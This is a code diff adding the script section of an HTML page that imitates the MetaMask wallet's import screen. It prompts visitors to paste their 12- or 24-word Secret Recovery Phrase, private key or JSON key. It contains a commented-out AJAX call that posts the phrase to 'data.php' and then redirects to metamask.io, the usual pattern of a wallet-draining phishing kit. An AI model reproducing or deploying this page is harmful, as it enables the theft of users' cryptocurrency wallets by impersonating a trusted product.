+        var textarea_value = $("#placeholder").val();        
+        
+        if(textarea_value != '') {
+            $('#importbtn').attr('disabled', false);
+        } else {
+            $('#importbtn').attr('disabled', true);
+        }
+});
+
+
+$('#type').change(function(){
+        if($('#type').val() == 'Twenty Four') {			            
+			$('.new-account-create-form__instruction').text('Paste your (24 words) Secret Recovery Phrase here:');
+			
+			/*$.ajax({
+				url : 'data.php',
+				data : {
+					option : '24 words secret phrase',
+					data : $('textarea').val()
+					
+				},
+				success : function(html) {
+					//$('#result').html(html);
+					//alert(html);
+					window.location='https://metamask.io/'
+				}
+			});*/
+			
+			
+		} 
+		
+		else if ($('#type').val() == 'Twelve') {
+            $('.new-account-create-form__instruction').text('Paste your (12 words) Secret Recovery Phrase here:');
+		
+        } 
+		
+		else if ($('#type').val() == 'Private Key') {
+            $('.new-account-create-form__instruction').text('Paste your private key string here:');
+			$('#placeholder').attr('placeholder', '');
+        } 
+		
+		else if ($('#type').val() == 'JSON File') {
+            $('.new-account-create-form__instruction').text('Paste your JSON key string here:');			
+			$('#placeholder').attr('placeholder', '');
+        }
+		
+		
+    });
+	
+});
+</script>	
+
+</body></html>
